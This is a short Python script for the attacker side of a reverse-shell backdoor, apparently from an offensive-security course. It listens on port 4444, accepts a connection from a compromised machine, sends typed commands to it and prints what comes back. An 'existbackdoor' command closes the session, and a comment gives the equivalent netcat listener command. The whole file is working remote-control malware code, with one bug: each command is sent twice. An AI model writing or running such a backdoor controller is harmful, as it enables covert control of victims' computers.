#!usr/bin/env python3

import socket, json


class Listener:
    def __init__(self, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # this line will reuse socket if connection dropped
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("", port))
        listener.listen(1)
        print("[+] waiting for a connection")
        self.connection, address = listener.accept()
        print("[+] got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "existbackdoor":
            self.connection.close()
            exit()
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            command=command.split(" ")
            result = self.execute_remotely(command)
            print(result)


# nc -vv -l -p 4444
my_listener = Listener(4444)
my_listener.run()
